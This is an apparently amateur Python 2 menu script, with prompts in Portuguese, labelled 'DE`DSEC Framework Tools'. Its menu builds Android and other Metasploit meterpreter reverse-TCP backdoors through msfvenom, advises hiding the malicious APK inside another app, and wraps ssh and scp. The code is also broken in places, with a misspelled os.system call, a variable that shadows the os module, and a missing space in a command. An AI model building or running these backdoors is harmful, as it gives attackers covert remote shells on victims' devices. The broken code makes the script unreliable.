import socket
import os
import sys


def apkmalware():
	print("[+] Recomendado esconder esse Malware em outro apk")
	ip = raw_input("Insira de seu ip ")
	port = raw_input("Insira a porta ")
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + "-f apk -o /root/Desktop/backdoor.apk")

def sshconnect():
	user = raw_input("Insira o usuario do ssh ")
	ip = raw_input("Insira o ip do usuario ")
	os.sytem("ssh " + user + "@" + ip)

def uploadssh():
	arquivo = raw_input("Insira o arquivo ")
	user = raw_input("Insira o usuario ")
	ip = raw_input("Insira o ip ")
	dest = raw_input("Insira o destino do arquivo")
	os.system("scp " + arquivo + " " + user + "@" + ip + ":" + dest)

def meterpreter():
	os = raw_input("Inisra o sistem operacional ")
	ip = raw_input("Insira seu ip ")
	port = raw_input("Insira a porta de escuta ")
	formato = raw_input("Insira o formato do arquivo ")
	os.system("msfvenom -p " + os + "/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f " + formato + " -o /root/Desktop/backdoor" + formato)

os.system("cls")
print (" __________________________________________________________________")
print ("|           ____  ______   ____  ______  ______________            |")
print ("|          / __ \/ ____/  / __ \/ ____/ / ____/ _______\           |")
print ("|         / / / / ___/   / / / /\____ \/ ___// /                   |")
print ("|        / /_/ / /_____ / /_/ /_____/ / /___/  \_______            |")
print ("|       /_____/_______//_____/_______/______/\________/            |")
print ("|                                                                  |")
print ("|                >:DE`DSEC Framework Tools                         |")
print ("|                                                                  |")
print ("|__________________________________________________________________|")
print (" ") 
print (" ")
print("[1] Backdoor APK MALWARE")
print("[2] SSH Connect")
print("[3] SSH Upload Archive")
print("[4] Create Metasploit Backdoor")
print(" ")
choice = raw_input(">DE`DSEC:/ ")
if choice == "1":
	apkmalware()
if choice == "2":
	sshconnect()
if choice == "3":
	uploadssh()
if choice == "4":
	meterpreter()